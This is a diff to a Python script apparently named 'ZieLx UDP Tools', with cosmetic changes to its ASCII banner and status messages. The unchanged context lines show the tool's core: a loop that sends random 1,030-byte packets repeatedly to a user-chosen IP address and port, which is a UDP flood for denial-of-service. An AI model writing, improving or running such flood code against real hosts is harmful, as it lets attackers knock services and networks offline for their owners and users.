@@ -30,8 +30,13 @@ os.system("clear")
 
 print("""
 \033[94m
- 
- ███████╗██╗███████╗██╗░░░░░██╗░░██╗ ╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝ ░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░ ██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░ ███████╗██║███████╗███████╗██╔╝╚██╗ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
+
+███████╗██╗███████╗██╗░░░░░██╗░░██╗
+╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝
+░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░
+██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░
+███████╗██║███████╗███████╗██╔╝╚██╗
+╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
          ++   ZieLx UDP Tools   ++
       ++    Dont Abusing My Tools   ++
 """)
@@ -62,9 +67,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"\033[96m ZieLx Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
+			print(i +"\u001b[31m ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
 		except:
-			print("\033[96m[•] ZieLx Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
+			print("\u001b[31m[•] ZieLx Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
 
 def run2():
 	data = random._urandom(1030)
